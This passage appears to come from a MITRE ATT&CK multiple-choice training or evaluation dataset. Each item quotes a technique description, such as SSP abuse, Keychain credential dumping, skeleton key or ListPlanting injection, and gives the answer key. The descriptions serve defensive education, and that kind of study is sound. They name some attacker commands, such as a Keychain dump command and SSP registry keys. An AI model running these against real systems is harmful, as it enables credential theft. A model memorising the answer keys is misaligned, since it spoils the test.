    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\nA. Remote Services: VNC, B. Hijack Execution Flow: Path Interception by Search Order Hijacking, C. Boot or Logon Autostart Execution: Security Support Provider, D. Cloud Administration Command\nAnswer:",
    "context": "",
    "output": "C. Boot or Logon Autostart Execution: Security Support Provider",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",
      "options": "A. Remote Services: VNC, B. Hijack Execution Flow: Path Interception by Search Order Hijacking, C. Boot or Logon Autostart Execution: Security Support Provider, D. Cloud Administration Command",
      "choice": "C. Boot or Logon Autostart Execution: Security Support Provider",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code>  . Adversaries may also leverage a Network Device CLI on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).\n\nPassword policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS .\n\nA. Subvert Trust Controls: Mark-of-the-Web Bypass, B. Data Encoding: Non-Standard Encoding, C. Data from Configuration Repository, D. Password Policy Discovery\nA:",
    "context": "",
    "output": "D. Password Policy Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code>  . Adversaries may also leverage a Network Device CLI on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).\n\nPassword policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS .",
      "options": "A. Subvert Trust Controls: Mark-of-the-Web Bypass, B. Data Encoding: Non-Standard Encoding, C. Data from Configuration Repository, D. Password Policy Discovery",
      "choice": "D. Password Policy Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to position themselves between two or more networked devices using an the technique (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware. Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens (Steal Application Access Token) and session cookies (Steal Web Session Cookie). Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to Impair Defenses and/or in support of a Network Denial of Service.\nA. Adversary-in-the-Middle, B. Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access, C. Email Collection, D. Hijack Execution Flow: AppDomainManager",
    "context": "",
    "output": "A. Adversary-in-the-Middle",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to position themselves between two or more networked devices using an the technique (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware. Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens (Steal Application Access Token) and session cookies (Steal Web Session Cookie). Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to Impair Defenses and/or in support of a Network Denial of Service.",
      "options": "A. Adversary-in-the-Middle, B. Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access, C. Email Collection, D. Hijack Execution Flow: AppDomainManager",
      "choice": "A. Adversary-in-the-Middle",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nA. Data Encoding, B. Gather Victim Host Information: Firmware, C. Data from Information Repositories: Confluence, D. Impair Defenses: Disable Windows Event Logging\nAnswer:",
    "context": "",
    "output": "C. Data from Information Repositories: Confluence",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources",
      "options": "A. Data Encoding, B. Gather Victim Host Information: Firmware, C. Data from Information Repositories: Confluence, D. Impair Defenses: Disable Windows Event Logging",
      "choice": "C. Data from Information Repositories: Confluence",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.\nA. Hide Infrastructure, B. Encrypted Channel: Symmetric Cryptography, C. Boot or Logon Autostart Execution: Authentication Package, D. OS Credential Dumping: /etc/passwd and /etc/shadow\nAnswer:",
    "context": "",
    "output": "B. Encrypted Channel: Symmetric Cryptography",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "options": "A. Hide Infrastructure, B. Encrypted Channel: Symmetric Cryptography, C. Boot or Logon Autostart Execution: Authentication Package, D. OS Credential Dumping: /etc/passwd and /etc/shadow",
      "choice": "B. Encrypted Channel: Symmetric Cryptography",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\n\nPossible answers:\nA. Masquerading, B. Subvert Trust Controls: Mark-of-the-Web Bypass, C. Multi-Factor Authentication Request Generation, D. Brute Force: Credential Stuffing",
    "context": "",
    "output": "D. Brute Force: Credential Stuffing",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.",
      "options": "A. Masquerading, B. Subvert Trust Controls: Mark-of-the-Web Bypass, C. Multi-Factor Authentication Request Generation, D. Brute Force: Credential Stuffing",
      "choice": "D. Brute Force: Credential Stuffing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems. In some cases, adversary groups may form partnerships to share compromised systems with each other.\n\nFootholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., Web Shell) or established access via External Remote Services. In some cases, access brokers will implant compromised systems with a \u201cload\u201d that can be used to install additional malware for paying customers.\n\nBy leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.\n\nIn some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a Trusted Relationship, Multi-Factor Authentication Interception, or even Supply Chain Compromise.\n\n**Note:** while this technique is distinct from other behaviors such as Purchase Technical Data and Credentials, they may often be used in conjunction (especially where the acquired foothold requires Valid Accounts).\n\nPossible answers:\nA. Modify Authentication Process: Multi-Factor Authentication, B. Stage Capabilities, C. Boot or Logon Initialization Scripts: Network Logon Script, D. Acquire Access",
    "context": "",
    "output": "D. Acquire Access",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems. In some cases, adversary groups may form partnerships to share compromised systems with each other.\n\nFootholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., Web Shell) or established access via External Remote Services. In some cases, access brokers will implant compromised systems with a \u201cload\u201d that can be used to install additional malware for paying customers.\n\nBy leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.\n\nIn some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a Trusted Relationship, Multi-Factor Authentication Interception, or even Supply Chain Compromise.\n\n**Note:** while this technique is distinct from other behaviors such as Purchase Technical Data and Credentials, they may often be used in conjunction (especially where the acquired foothold requires Valid Accounts).",
      "options": "A. Modify Authentication Process: Multi-Factor Authentication, B. Stage Capabilities, C. Boot or Logon Initialization Scripts: Network Logon Script, D. Acquire Access",
      "choice": "D. Acquire Access",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.\nA. Hide Artifacts: Hidden File System, B. Lateral Tool Transfer, C. Credentials from Password Stores: Keychain, D. Event Triggered Execution: Component Object Model Hijacking",
    "context": "",
    "output": "C. Credentials from Password Stores: Keychain",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.",
      "options": "A. Hide Artifacts: Hidden File System, B. Lateral Tool Transfer, C. Credentials from Password Stores: Keychain, D. Event Triggered Execution: Component Object Model Hijacking",
      "choice": "C. Credentials from Password Stores: Keychain",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\nThe technique can be done using various common operating system utilities such as Net/SMB or FTP. On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API.\n\nPossible answers:\nA. Obtain Capabilities: Malware, B. Unsecured Credentials: Cloud Instance Metadata API, C. Boot or Logon Autostart Execution, D. Exfiltration Over Alternative Protocol",
    "context": "",
    "output": "D. Exfiltration Over Alternative Protocol",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\nThe technique can be done using various common operating system utilities such as Net/SMB or FTP. On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API.",
      "options": "A. Obtain Capabilities: Malware, B. Unsecured Credentials: Cloud Instance Metadata API, C. Boot or Logon Autostart Execution, D. Exfiltration Over Alternative Protocol",
      "choice": "D. Exfiltration Over Alternative Protocol",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.\n\nA. External Remote Services, B. Command and Scripting Interpreter: Windows Command Shell, C. Process Injection: Thread Execution Hijacking, D. Unsecured Credentials: Credentials in Registry\nA:",
    "context": "",
    "output": "A. External Remote Services",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.",
      "options": "A. External Remote Services, B. Command and Scripting Interpreter: Windows Command Shell, C. Process Injection: Thread Execution Hijacking, D. Unsecured Credentials: Credentials in Registry",
      "choice": "A. External Remote Services",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.\n\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.\n\nOptions:\nA. Multi-Stage Channels, B. Data from Information Repositories: Sharepoint, C. Impair Defenses, D. Gather Victim Network Information: DNS",
    "context": "",
    "output": "C. Impair Defenses",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.\n\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.",
      "options": "A. Multi-Stage Channels, B. Data from Information Repositories: Sharepoint, C. Impair Defenses, D. Gather Victim Network Information: DNS",
      "choice": "C. Impair Defenses",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).\n\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.\n\nOptions:\nA. Account Discovery: Email Account, B. Boot or Logon Autostart Execution: LSASS Driver, C. Domain Trust Discovery, D. Virtualization/Sandbox Evasion: User Activity Based Checks",
    "context": "",
    "output": "A. Account Discovery: Email Account",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).\n\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.",
      "options": "A. Account Discovery: Email Account, B. Boot or Logon Autostart Execution: LSASS Driver, C. Domain Trust Discovery, D. Virtualization/Sandbox Evasion: User Activity Based Checks",
      "choice": "A. Account Discovery: Email Account",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user\u2019s account and/or credentials (ex: Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.\n\nPossible answers:\nA. Web Service: Dead Drop Resolver, B. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations, C. Boot or Logon Autostart Execution: XDG Autostart Entries, D. Modify Authentication Process: Domain Controller Authentication",
    "context": "",
    "output": "D. Modify Authentication Process: Domain Controller Authentication",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user\u2019s account and/or credentials (ex: Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.",
      "options": "A. Web Service: Dead Drop Resolver, B. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations, C. Boot or Logon Autostart Execution: XDG Autostart Entries, D. Modify Authentication Process: Domain Controller Authentication",
      "choice": "D. Modify Authentication Process: Domain Controller Authentication",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items. Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items. Adversaries must first copy code into the target process\u2019 memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other Process Injection methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory. \n\nFinally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.\n\nA. Hijack Execution Flow: Dylib Hijacking, B. Web Service, C. Process Injection: ListPlanting, D. User Execution: Malicious File\nAnswer:",
    "context": "",
    "output": "C. Process Injection: ListPlanting",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items. Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items. Adversaries must first copy code into the target process\u2019 memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other Process Injection methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory. \n\nFinally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.",
      "options": "A. Hijack Execution Flow: Dylib Hijacking, B. Web Service, C. Process Injection: ListPlanting, D. User Execution: Malicious File",
      "choice": "C. Process Injection: ListPlanting",
      "category": [
        "MITREFlan"
      ],
